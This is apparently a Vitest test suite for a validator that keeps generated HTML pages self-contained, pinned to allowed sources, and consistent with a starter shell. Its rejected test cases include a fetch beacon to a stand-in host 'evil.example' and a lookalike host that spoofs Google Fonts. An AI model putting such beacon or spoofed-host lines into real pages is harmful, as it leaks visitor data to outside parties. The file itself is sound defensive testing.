import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import {
  checkExampleMeta,
  checkPageIcon,
  checkPageScripts,
  checkPageWidget,
  checkSelfContained,
  checkShell,
} from "./check-ideas.ts";
import { ALLOWED_SOURCES_PATH, type ExampleMeta } from "./ideas.ts";

function errorsFor(html: string): string[] {
  const errors: string[] = [];
  checkSelfContained("page.html", html, errors);
  return errors;
}

describe("checkSelfContained", () => {
  it("passes the three families a starter is allowed to load", () => {
    expect(
      errorsFor(`
        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter" />
        <link rel="stylesheet" href="https://esm.sh/@phosphor-icons/web@2.1.2/src/regular/style.css" />
        <script src="https://esm.sh/@tailwindcss/browser@4.3.3?raw"></script>
      `),
    ).toEqual([]);
  });

  it.each([
    [
      "a module import",
      `<script type="module">const Plot = await import("https://esm.sh/@observablehq/plot@0.6.17");</script>`,
    ],
    [
      "an import carrying a deps query",
      `<script type="module">import("https://esm.sh/@excalidraw/excalidraw@0.18.1?deps=react@19.2.5,react-dom@19.2.5");</script>`,
    ],
    [
      "a prerelease version",
      `<script src="https://esm.sh/some-lib@2.0.0-beta.3/dist/x.js?raw"></script>`,
    ],
    [
      "a stylesheet by path",
      `<link rel="stylesheet" href="https://esm.sh/leaflet@1.9.4/dist/leaflet.css" />`,
    ],
  ])("passes %s from esm.sh, pinned to an exact version", (_name, html) => {
    expect(errorsFor(html)).toEqual([]);
  });

  // Each of these resolves to whatever is newest the day the page is opened,
  // which is the one kind of change the offline test cannot catch.
  it.each([
    ["a major version", `<script src="https://esm.sh/chart.js@4"></script>`],
    ["a minor version", `<script src="https://esm.sh/chart.js@4.5"></script>`],
    ["no version", `<script src="https://esm.sh/chart.js"></script>`],
    [
      "no version, inside a script",
      `<script type="module">await import("https://esm.sh/react");</script>`,
    ],
  ])("rejects an esm.sh package with %s", (_name, html) => {
    expect(errorsFor(html)).toHaveLength(1);
  });

  it("passes an inline image and an inline script", () => {
    expect(
      errorsFor(`
        <img src="data:image/jpeg;base64,/9j/4AAQ" />
        <script>document.title = "fine";</script>
      `),
    ).toEqual([]);
  });

  it("leaves hyperlinks alone, wherever they point", () => {
    expect(
      errorsFor(`<a href="https://www.example.com/a-product">A product</a>`),
    ).toEqual([]);
  });

  // Each of these loaded from the network while passing the older check, which
  // only recognized a double-quoted href or src on a short list of tags.
  it.each([
    ["a single-quoted src", `<img src='https://evil.example/a.jpg' />`],
    ["an unquoted src", `<img src=https://evil.example/a.jpg />`],
    ["a srcset candidate", `<img srcset="https://evil.example/a.jpg 2x" />`],
    ["a video poster", `<video poster="https://evil.example/f.jpg"></video>`],
    [
      "a CSS url() in a style attribute",
      `<div style="background-image:url(https://evil.example/b.jpg)"></div>`,
    ],
    [
      "a CSS url() in a style block",
      `<style>body{background:url('https://evil.example/b.jpg')}</style>`,
    ],
  ])("rejects %s", (_name, html) => {
    expect(errorsFor(html)).toHaveLength(1);
  });

  it("rejects a host that merely starts with an allowed one", () => {
    expect(
      errorsFor(
        `<link rel="stylesheet" href="https://fonts.googleapis.com.evil.example/x.css" />`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "page.html: loads https://fonts.googleapis.com.evil.example/x.css, which is not an allowed source",
      ]
    `);
  });

  it("passes the favicon address a script is allowed to build", () => {
    expect(
      errorsFor(
        `<script>icon.src = "https://t0.gstatic.com/faviconV2?size=64&url=" + encodeURIComponent(origin);</script>`,
      ),
    ).toEqual([]);
  });

  it("passes the asset paths an allowed library builds for itself", () => {
    expect(
      errorsFor(
        `<script>initSqlJs({ locateFile: (f) => "https://esm.sh/sql.js@1.14.2/dist/" + f });</script>`,
      ),
    ).toEqual([]);
  });

  it("passes a map tile template, which is filled in per tile", () => {
    expect(
      errorsFor(
        `<script>L.tileLayer("https://tile.openstreetmap.org/{z}/{x}/{y}.png");</script>`,
      ),
    ).toEqual([]);
  });

  it("rejects any other address a script builds at runtime", () => {
    expect(
      errorsFor(`<script>fetch("https://evil.example/beacon?p=1");</script>`),
    ).toMatchInlineSnapshot(`
      [
        "page.html: a script reaches https://evil.example/beacon?p=1, which is not an address a script may build at runtime",
      ]
    `);
  });

  it("rejects an allowed origin serving a path outside its family", () => {
    expect(
      errorsFor(
        `<script src="https://tryinstrument.com/something-else.js"></script>`,
      ),
    ).toHaveLength(1);
  });
});

describe("checkExampleMeta", () => {
  const complete = {
    title: "Six project tools for a 12-person agency",
    variant: "Six options as columns, in bands you open one at a time",
    prompt: "Compare six project tools for an agency that bills by the hour.",
    model: "claude-fable-5-1",
    note: "Wide grid, options as columns, four attribute bands.",
  } satisfies ExampleMeta;

  function errorsForMeta(meta: ExampleMeta): string[] {
    const errors: string[] = [];
    checkExampleMeta("examples/agency-project-tools", meta, errors);
    return errors;
  }

  it("passes a complete design note", () => {
    expect(errorsForMeta(complete)).toEqual([]);
  });

  // The shape capture used to write for an example whose sidecar was missing:
  // every key present, so the older check passed it.
  it("rejects the blank sidecar capture used to manufacture", () => {
    expect(
      errorsForMeta({
        title: "agency-project-tools",
        variant: "",
        prompt: "",
        model: "",
        note: "",
      }),
    ).toMatchInlineSnapshot(`
      [
        "examples/agency-project-tools.json needs a non-empty "variant"",
        "examples/agency-project-tools.json needs a non-empty "prompt"",
        "examples/agency-project-tools.json needs a non-empty "model"",
        "examples/agency-project-tools.json needs a non-empty "note"",
      ]
    `);
  });

  it("rejects a field that is only whitespace", () => {
    expect(errorsForMeta({ ...complete, note: "   " })).toHaveLength(1);
  });

  it("rejects a variant too long to sit on a card", () => {
    expect(
      errorsForMeta({ ...complete, variant: "x".repeat(81) }),
    ).toHaveLength(1);
  });
});

describe("checkPageWidget", () => {
  function widgetErrors(html: string): string[] {
    const errors: string[] = [];
    checkPageWidget("page.html", html, errors);
    return errors;
  }

  it("passes the tag every page carries", () => {
    expect(
      widgetErrors(
        `<head><script async src="https://tryinstrument.com/page.js"></script></head>`,
      ),
    ).toEqual([]);
  });

  it("reports a page that has no tag at all", () => {
    expect(widgetErrors("<head></head>")).toMatchInlineSnapshot(`
      [
        "page.html: no page widget tag; every page carries <script async src="https://tryinstrument.com/page.js"></script>",
      ]
    `);
  });

  // The failure this rule exists for: the page still works and still shares,
  // but to a second address, because the tag is inside what gets hashed.
  it("reports a tag that differs by a character", () => {
    expect(
      widgetErrors(
        `<head><script async src="https://tryinstrument.com/page.js" ></script></head>`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "page.html: the page widget tag is modified; it must be exactly <script async src="https://tryinstrument.com/page.js"></script>, byte for byte, or the page publishes to a different address",
      ]
    `);
  });

  it("reports a tag that dropped async", () => {
    expect(
      widgetErrors(
        `<head><script src="https://tryinstrument.com/page.js"></script></head>`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "page.html: the page widget tag is modified; it must be exactly <script async src="https://tryinstrument.com/page.js"></script>, byte for byte, or the page publishes to a different address",
      ]
    `);
  });
});

describe("checkPageIcon", () => {
  function iconErrors(html: string): string[] {
    const errors: string[] = [];
    checkPageIcon("page.html", html, errors);
    return errors;
  }

  it("passes an inline icon", () => {
    expect(
      iconErrors(
        `<head><link rel="icon" href="data:image/svg+xml,%3Csvg/%3E" /></head>`,
      ),
    ).toEqual([]);
  });

  it("reports a page with no icon", () => {
    expect(iconErrors("<head></head>")).toMatchInlineSnapshot(`
      [
        "page.html: no inline icon; every page carries \`<link rel="icon" href="data:image/svg+xml,…">\`, so a tab wears the mark with nothing to fetch",
      ]
    `);
  });

  // The whole point of inlining it: a page opened from a folder, offline, still
  // wears the mark. An icon fetched from anywhere does not.
  it("reports an icon that went remote", () => {
    expect(
      iconErrors(
        `<head><link rel="icon" href="https://tryinstrument.com/favicon.svg" /></head>`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "page.html: no inline icon; every page carries \`<link rel="icon" href="data:image/svg+xml,…">\`, so a tab wears the mark with nothing to fetch",
      ]
    `);
  });
});

describe("checkShell", () => {
  const shell = ["<link rel='icon' />", "<style>a{}</style>"];

  function shellErrors(html: string): string[] {
    const errors: string[] = [];
    checkShell("page.html", html, shell, errors);
    return errors;
  }

  const wrap = (...blocks: string[]) =>
    blocks
      .map((b) => `<!-- shell:start -->${b}<!-- shell:end -->`)
      .join("<p>the page's own</p>");

  it("passes a page carrying the starter's regions", () => {
    expect(shellErrors(wrap(...shell))).toEqual([]);
  });

  it("names which region drifted", () => {
    expect(shellErrors(wrap(shell[0]!, "<style>a{color:red}</style>")))
      .toMatchInlineSnapshot(`
      [
        "page.html: shared region 2 differs from starter.html; run \`pnpm fix:shell\`",
      ]
    `);
  });

  it("reports a page missing a region entirely", () => {
    expect(shellErrors(wrap(shell[0]!))).toMatchInlineSnapshot(`
      [
        "page.html: has 1 shared region(s) where the starter has 2; run \`pnpm fix:shell\`",
      ]
    `);
  });

  it("ignores what a page puts between the regions", () => {
    const html = `${wrap(shell[0]!, shell[1]!)}<style>.mine{}</style>`;
    expect(shellErrors(html)).toEqual([]);
  });
});

describe("checkPageScripts", () => {
  function errorsFor(html: string): string[] {
    const errors: string[] = [];
    checkPageScripts("page.html", html, errors);
    return errors;
  }

  it.each([
    ["a module script", `<script type="module">draw();</script>`],
    [
      "a module script, quoted the other way",
      `<script type='module'>draw();</script>`,
    ],
    [
      "an external script",
      `<script src="https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js"></script>`,
    ],
    ["a data block", `<script type="application/json">{"a":1}</script>`],
    ["an import map", `<script type="importmap">{"imports":{}}</script>`],
    [
      "a plain script inside a shared region",
      `<!-- shell:start --><script>keep();</script><!-- shell:end -->`,
    ],
    ["a page with no script", `<main><p>Words.</p></main>`],
  ])("passes %s", (_name, html) => {
    expect(errorsFor(html)).toEqual([]);
  });

  it.each([
    ["a plain script", `<script>draw();</script>`],
    [
      "a script typed as JavaScript",
      `<script type="text/javascript">draw();</script>`,
    ],
    [
      "a plain script after a shared region",
      `<!-- shell:start --><script>keep();</script><!-- shell:end --><script>draw();</script>`,
    ],
  ])("rejects %s", (_name, html) => {
    expect(errorsFor(html)).toHaveLength(1);
  });

  it("says what to do instead", () => {
    expect(errorsFor(`<script>draw();</script>`)).toMatchInlineSnapshot(`
      [
        "page.html: \`<script>\` runs while the page is still parsing, before the shell keeps its copy for sharing, so what it draws would publish; a page's own scripts are \`<script type="module">\`",
      ]
    `);
  });
});

describe("allowed-sources.json", () => {
  const allowed = JSON.parse(readFileSync(ALLOWED_SOURCES_PATH, "utf-8")) as {
    built: { prefix: string; why: string }[];
    tags: { origin: string; path: string; pin?: string; why: string }[];
  };

  // The pages worker reads the same file and takes every origin into a CSP
  // directive, where a path or a trailing slash would be a different value.
  it.each(allowed.tags.map((tag) => [tag.origin, tag]))(
    "%s is a bare https origin with a path family and a reason",
    (_origin, tag) => {
      expect(new URL(tag.origin).origin).toBe(tag.origin);
      expect(tag.origin.startsWith("https://")).toBe(true);
      expect(tag.path.startsWith("/")).toBe(true);
      expect(tag.why.length).toBeGreaterThan(0);
      const pin = tag.pin;
      if (pin !== undefined) expect(() => new RegExp(pin)).not.toThrow();
    },
  );

  it.each(allowed.built.map((built) => [built.prefix, built]))(
    "%s is an https address with a reason",
    (_prefix, built) => {
      expect(new URL(built.prefix).protocol).toBe("https:");
      expect(built.why.length).toBeGreaterThan(0);
    },
  );
});
